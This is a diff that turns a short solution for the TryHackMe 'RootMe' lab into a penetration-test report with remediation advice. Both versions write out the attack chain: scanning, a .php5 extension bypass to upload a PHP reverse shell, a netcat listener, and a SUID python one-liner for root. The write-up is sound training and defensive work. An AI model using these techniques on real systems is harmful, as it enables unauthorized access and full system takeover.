@@ -1,40 +1,244 @@
-# RootMe - solution
+---
+layout: default
+title: RootMe
+---
+
+# 📝 RootMe - Solution
 - Link: https://tryhackme.com/room/rrootme
 - Difficulty: `easy`
 
-## Host recognition
-- `cd nmap`
--  `nmap <IP> --open -oG scan`
- -  `extractPorts scan` (custom command) to copy open ports
-- `nmap <IP> -sCV -p22,80 -oN ports `
+---
 
-## Port 80 - website recognition
-- `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -o hidden_dir` to discover hidden directories
-- Found `/panel` and `/uploads`
-- Found an input form on `http://<IP>/panel`
+# ☰ 1. Executive Summary
 
-## Exploitation
-- `cd scripts`
-- Downloaded `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` 
-- Set my own IP and a random port in that code
-- Renamed it with `.php5` extension because `.php` was not accepted
-- Uploaded the file
-- `nc -lvnp <port>` to make NetCat listen on the specified port
-- Visited `http://<IP>/uploads` and run the uploaded file 
-- Inside the reverse shell:
-  - `cd /var/www`
-  - `cat user.txt`
-    - Found the `USER FLAG`
-  
-## Privileges escalation
-- Inside the reverse shell:
-  - Couldn't access `/root`, so:
-  - `find / -user root -perm /4000` (THM hint to find binaries)
-  - Found `/usr/bin/python`
-- Checked it on https://gtfobins.github.io (filtered by SUID) and found how to exploit the binary
-- Inside the reverse shell:
-  - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")' `
-  - `whoami` to check if I became the root 
-  - `cd /root`
-  - `cat root.txt` 
-    - Found the `ROOT FLAG`
+The objective of this assessment was to identify security weaknesses in the exposed web application and obtain both user-level and root-level access.
+
+The attack chain included:
+- Service enumeration
+- Web directory enumeration
+- File upload bypass
+- Remote Code Execution (RCE)
+- Reverse shell access
+- Privilege escalation via a misconfigured SUID binary
+
+Full administrative (root) compromise was successfully achieved.
+
+**Overall Risk Rating: Critical**
+
+---
+
+# 🛠️ 2. Scope and Methodology
+
+## Scope
+
+- Single Linux target machine
+- No credentials provided
+- External attacker perspective
+
+## Methodology
+
+The following penetration testing phases were performed:
+
+1. Reconnaissance
+2. Service Enumeration
+3. Web Enumeration
+4. Initial Access
+5. Post-Exploitation Enumeration
+6. Privilege Escalation
+
+## Tools Used
+
+- Nmap
+- Gobuster
+- Netcat
+- PentestMonkey PHP Reverse Shell
+- GTFOBins
+- Native Linux enumeration commands
+
+---
+
+# 🔍 3. Reconnaissance
+
+## 3.1 Port Discovery
+
+Initial scan:
+
+```bash
+nmap --open <TARGET_IP> -oG scan
+```
+
+Service and version detection:
+
+```bash
+nmap -sCV -p22,80 <TARGET_IP> -oN ports
+```
+
+### Open Ports Identified
+
+| Port | Service | Version |
+|------|----------|----------|
+| 22 | SSH | OpenSSH |
+| 80 | HTTP | Apache HTTP Server |
+
+---
+
+# 🌐 4. Web Enumeration (Port 80)
+
+Directory enumeration was performed using Gobuster:
+
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
+
+Discovered directories:
+
+```
+/panel
+/uploads
+```
+
+The `/panel` endpoint exposed a file upload functionality.
+
+## 4.1 File Upload Analysis
+
+A PHP reverse shell was downloaded:
+
+```text
+https://github.com/pentestmonkey/php-reverse-shell
+```
+
+The payload was configured with the attacker's IP address and listening port.
+
+Since the application rejected `.php` files, the payload was renamed to:
+
+```
+shell.php5
+```
+
+The upload was accepted successfully.
+
+### Findings
+
+The web application allowed executable PHP files to be uploaded by bypassing the extension filter.
+
+### Vulnerability Identified
+
+**Unrestricted File Upload**
+
+The upload mechanism relied solely on extension filtering, allowing attackers to bypass restrictions using the `.php5` extension.
+
+- Severity: High
+- Impact: Remote Code Execution
+
+---
+
+# 🔐 5. Initial Access (Web Exploitation)
+
+A Netcat listener was started:
+
+```bash
+nc -lvnp <PORT>
+```
+
+The uploaded payload was executed by visiting:
+
+```
+http://<TARGET_IP>/uploads
+```
+
+A reverse shell was successfully established.
+
+The user flag was then retrieved:
+
+```bash
+cd /var/www
+cat user.txt
+```
+
+---
+
+# 🔓 6. Post-Exploitation
+
+After obtaining shell access, local enumeration was performed.
+
+The current user lacked permission to access the `/root` directory, indicating that privilege escalation was required.
+
+---
+
+# 📶 7. Privilege Escalation
+
+## 7.1 SUID Enumeration
+
+Search for SUID binaries:
+
+```bash
+find / -user root -perm /4000
+```
+
+The following binary was identified:
+
+```
+/usr/bin/python
+```
+
+Consulting GTFOBins confirmed that the binary could be abused to spawn a privileged shell.
+
+## 7.2 Exploitation
+
+Execute:
+
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+Verify privileges:
+
+```bash
+whoami
+```
+
+Output:
+
+```
+root
+```
+
+Retrieve the root flag:
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+# 🎯 8. Vulnerability Summary
+
+| Vulnerability | Description | Severity |
+|---------------|------------|----------|
+| Unrestricted File Upload | Executable PHP files could be uploaded by bypassing extension filtering. | High |
+| Remote Code Execution | Uploaded PHP payload executed on the server, allowing arbitrary command execution. | Critical |
+| Misconfigured SUID Binary | Python executable with the SUID bit enabled allowed privilege escalation to root. | Critical |
+
+---
+
+# ⚠️ 9. Risk Assessment
+
+The combination of an insecure file upload mechanism and a misconfigured SUID binary resulted in a complete system compromise.
+
+The most severe issue was the ability to execute arbitrary PHP code through the upload functionality, which provided an initial foothold and ultimately led to full administrative access.
+
+**Overall Risk: Critical**
+
+---
+
+# 🩹 10. Solutions
+
+1. Restrict uploads to an explicit whitelist of allowed file types.
+2. Validate uploaded files using MIME type and file content inspection.
+3. Disable script execution within upload directories.
+4. Store uploaded files outside the web root.
+5. Remove unnecessary SUID permissions from binaries such as Python.
+6. Regularly audit SUID-enabled executables.
+7. Apply the principle of least privilege across the operating system.
+8. Monitor file upload activity and privilege escalation attempts through centralized logging.
